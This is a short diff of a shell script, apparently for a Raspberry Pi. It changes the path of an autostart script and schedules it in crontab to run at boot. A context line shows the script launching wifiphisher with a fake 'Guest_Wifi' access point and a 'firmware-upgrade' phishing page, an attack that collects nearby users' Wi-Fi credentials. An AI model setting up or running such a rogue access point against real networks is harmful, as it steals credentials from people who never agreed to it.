@@ -23,7 +23,7 @@ sudo wifiphisher -i wlan1 -e Guest_Wifi -p firmware-upgrade -nD --logging
 ' > autostart.sh
 
 # Path to your script
-script_path="/home/wifi-pi/autostart.sh"
+script_path="/home/pi/autostart.sh"
 
 # Add a line to crontab to run the script at boot
 (crontab -l ; echo "@reboot $script_path") | crontab -
